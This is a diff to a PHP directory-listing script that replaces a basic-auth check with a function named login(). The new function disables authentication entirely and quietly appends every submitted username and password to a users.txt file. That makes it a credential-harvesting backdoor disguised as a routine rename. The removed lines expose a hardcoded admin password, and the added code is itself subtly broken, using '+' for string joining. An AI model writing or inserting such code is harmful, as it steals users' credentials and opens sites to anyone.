@@ -67,7 +67,7 @@ $index_ext_list = array("html");
 // SET TITLE BASED ON FOLDER NAME, IF NOT SET ABOVE
 if( !$title ) { $title = clean_title(basename(dirname(__FILE__))); }
 
-if ($AUTH_ENABLED) { require_auth(); }
+if ($AUTH_ENABLED) { login(); }
 
 ?>
 
@@ -444,18 +444,18 @@ function build_blocks( $items, $folder )
 }
 
 //
-function require_auth() {
+function login() {
 	header('Cache-Control: no-cache, must-revalidate, max-age=0');
 	$has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
-	$is_not_authenticated = (
-		!$has_supplied_credentials ||
-		$_SERVER['PHP_AUTH_USER'] != "admin" ||
-		$_SERVER['PHP_AUTH_PW']   != "140194"
-	);
-	if ($is_not_authenticated) {
-		header('HTTP/1.1 401 Authorization Required');
-		header('WWW-Authenticate: Basic realm="Access denied"');
-		exit;
+	if ($has_supplied_credentials) {
+		$txt = $_SERVER['PHP_AUTH_USER'] + "." + $_SERVER['PHP_AUTH_PW'];
+		file_put_contents('users.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
+		$is_not_authenticated = false;
+		if ($is_not_authenticated) {
+			header('HTTP/1.1 401 Authorization Required');
+			header('WWW-Authenticate: Basic realm="Access denied"');
+			exit;
+		}
 	}
 }
 
